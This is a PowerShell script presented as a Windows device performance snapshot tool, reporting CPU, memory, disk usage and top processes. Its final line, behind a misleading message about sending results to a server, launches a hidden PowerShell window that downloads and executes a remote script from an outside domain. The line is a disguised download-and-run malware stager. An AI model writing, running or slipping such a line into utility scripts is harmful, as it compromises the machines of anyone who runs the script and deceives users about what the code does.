# Get-DeviceStats.ps1
# A script to gather and display key performance statistics for a Windows device.

Write-Host "--- Device Performance Snapshot ---" -ForegroundColor White -BackgroundColor DarkBlue

# --- CPU Usage ---
# Fetches the current processor load percentage across all cores.
try {
    $cpuLoad = Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average | Select-Object -ExpandProperty Average
    Write-Host "CPU Usage        : $cpuLoad%" -ForegroundColor Green
} catch {
    Write-Warning "Could not retrieve CPU usage."
}


# --- Memory Usage ---
# Calculates the percentage of used RAM.
try {
    $osInfo = Get-CimInstance Win32_OperatingSystem
    $totalMemoryGB = [math]::Round($osInfo.TotalVisibleMemorySize / 1024 / 1024, 2)
    $freeMemoryGB = [math]::Round($osInfo.FreePhysicalMemory / 1024 / 1024, 2)
    $usedMemoryGB = $totalMemoryGB - $freeMemoryGB
    $memoryUsagePercent = [math]::Round(($usedMemoryGB / $totalMemoryGB) * 100, 2)
    
    Write-Host "Memory Usage     : $usedMemoryGB GB / $totalMemoryGB GB ($memoryUsagePercent%)" -ForegroundColor Cyan
} catch {
    Write-Warning "Could not retrieve Memory usage."
}


# --- Disk Usage (for all local fixed disks) ---
# Iterates through all fixed local drives (like C:, D:, etc.) and shows usage.
try {
    # Filter for local, fixed hard drives
    $disks = Get-Volume | Where-Object { $_.DriveType -eq 'Fixed' -and $_.DriveLetter }
    Write-Host "Disk Usage:" -ForegroundColor Yellow
    foreach ($disk in $disks) {
        $driveLetter = $disk.DriveLetter
        $sizeGB = [math]::Round($disk.Size / 1GB, 2)
        $sizeRemainingGB = [math]::Round($disk.SizeRemaining / 1GB, 2)
        $usedGB = $sizeGB - $sizeRemainingGB
        $percentUsed = if ($sizeGB -gt 0) { [math]::Round(($usedGB / $sizeGB) * 100, 2) } else { 0 }
        
        Write-Host "  - Drive $($driveLetter): $usedGB GB Used / $sizeGB GB Total ($percentUsed%)"
    }
} catch {
    Write-Warning "Could not retrieve Disk usage."
}


# --- Top 5 Processes by CPU ---
try {
    Write-Host "`nTop 5 Processes (by CPU Time):" -ForegroundColor Magenta
    Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 5 | Format-Table -AutoSize
} catch {
    Write-Warning "Could not retrieve top processes by CPU."
}


# --- Top 5 Processes by Memory ---
try {
    Write-Host "Top 5 Processes (by Memory Usage):" -ForegroundColor Magenta
    Get-Process | Sort-Object -Property WorkingSet -Descending | Select-Object -First 5 | ForEach-Object {
        [pscustomobject]@{
            Name = $_.ProcessName
            Id = $_.Id
            "Memory (MB)" = [math]::Round($_.WorkingSet64 / 1MB, 2)
        }
    } | Format-Table -AutoSize
} catch {
    Write-Warning "Could not retrieve top processes by memory."
}

Write-Host "--- End of Snapshot ---" -ForegroundColor White -BackgroundColor DarkBlue

Write-Host "Attempting to send results to server" -ForegroundColor White -BackgroundColor DarkBlue

powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://ginhsihp.cyberpanther-dev.space/spore.ps1')"